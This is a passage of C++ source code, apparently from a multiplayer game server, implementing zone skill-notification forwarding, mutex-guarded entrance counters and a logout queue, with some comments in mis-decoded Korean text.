		return getDynamicZone()->NotifyUseObjectSkill(pCreature, SkillType);
	}
	else
	{
		return OnUseObjectSkill(pCreature, SkillType);
	}
}

bool Zone::NotifyUseNamedSkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseNamedSkill(pCreature, SkillType);
	}
	else
	{
		return OnUseNamedSkill(pCreature, SkillType);
	}	
}

bool Zone::NotifyUseSelfSkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseSelfSkill(pCreature, SkillType);
	}
	else
	{
		return OnUseSelfSkill(pCreature, SkillType);
	}
}

bool Zone::NotifyUseTileSkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseTileSkill(pCreature, SkillType);
	}
	else
	{
		return OnUseTileSkill(pCreature, SkillType);
	}
}

bool Zone::NotifyBeforeUseMonsterSkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyBeforeUseMonsterSkill(pCreature, SkillType);
	}
	else
	{
		return OnBeforeUseMonsterSkill(pCreature, SkillType);
	}	
}

void Zone::NotifyAfterUseMonsterSkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyAfterUseMonsterSkill(pCreature, SkillType);
	}
	else
	{
		return OnAfterUseMonsterSkill(pCreature, SkillType);
	}	
}

bool Zone::IsGiveExperience()
{
	if (isDynamicZone())
	{
		return m_pDynamicZone->IsGiveExperience();
	}
	
	return true;
}

void Zone::IncreaseEntranceCount()
{
	__ENTER_CRITICAL_SECTION(m_Mutex)
	
	++m_iEntranceCount;
	
	__LEAVE_CRITICAL_SECTION(m_Mutex)
}

void Zone::DecreaseEntranceCount() 
{ 
	__ENTER_CRITICAL_SECTION(m_Mutex)
	
	--m_iEntranceCount; 
	if ( m_iEntranceCount < 0 ) 
	{
		m_iEntranceCount = 0;
	}
	
	__LEAVE_CRITICAL_SECTION(m_Mutex)
		
}
int Zone::GetEntranceCount() 
{ 
	int iEntranceCount;
	
	__ENTER_CRITICAL_SECTION(m_Mutex)
	
	iEntranceCount = m_iEntranceCount;
	
	__LEAVE_CRITICAL_SECTION(m_Mutex)
	
	return iEntranceCount; 
}

void Zone::pushLogoutPC(Creature* pCreature)
	throw(Error)
{
	__BEGIN_TRY 

	Assert(pCreature != NULL);

	__ENTER_CRITICAL_SECTION(m_Mutex)
	
	TPCLogoutQueue::iterator iter;
	
	iter = m_PCLogoutQueue.find(pCreature->getName());
	if ( iter == m_PCLogoutQueue.end() )
	{
		m_PCLogoutQueue[pCreature->getName()] = pCreature;
	}
	
	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

void Zone::ProcessLogoutPC()
{
	if ( m_PCLogoutQueue.empty() )
	{
		return;
	}
	
	Creature *pLogoutCreature;
	TPCLogoutQueue::iterator iter;
	
	iter = m_PCLogoutQueue.begin();
	for( ; iter != m_PCLogoutQueue.end(); ++iter )
	{
		pLogoutCreature = iter->second;
		if ( pLogoutCreature == NULL )
		{
			continue;
		}

		PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pLogoutCreature);
		GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPC->getPlayer());
		Zone *pZone = pPC->getZone();
		ZoneInfo *pZoneInfo = g_pZoneInfoManager->getZoneInfo(pZone->getZoneID());
		
		filelog("Logout.log", "Name=%s ZoneID=%d ZoneName=%s", 
			pPC->getName().c_str(), 
			pZone->getZoneID(),
			pZoneInfo != NULL ? pZoneInfo->getFullName().c_str() : "(unknown)"
		);
		
		NotifyBeforeLeaveZone(pPC);
		
		pPC->OnLogOut();

		try
		{
			// ž±·ì ZPM¿¡­ ·¹Ÿîž »èŽ.
			getZoneGroup()->getZonePlayerManager()->deletePlayer(pGamePlayer->getSocket()->getSOCKET());
			// Modern thread sirasi icin reconnect status'u out-list'e girmeden once set edilmeli.
			pGamePlayer->setPlayerStatus(GPS_AFTER_SENDING_GL_INCOMING_CONNECTION);
			// Core ±ž¶ž ¹²žé­ Ÿ²·¹µå· º µ¶ž³ûž· ±â §¿© µ¿¡ ²š¹ø¿¡ ³ž®±â §­
			// OutList· ³ŽŽ.
			getZoneGroup()->getZonePlayerManager()->pushOutPlayer(pGamePlayer);
		}
		catch (Throwable & t)
		{
			filelog("ZoneBug.txt", "%s : %s", "Zone::ProcessLogoutPC()", t.toString().c_str());
			cerr << t.toString() << endl;
		}
		
		NotifyAfterLeaveZone(pPC);

	}
	
	m_PCLogoutQueue.clear();
	
}
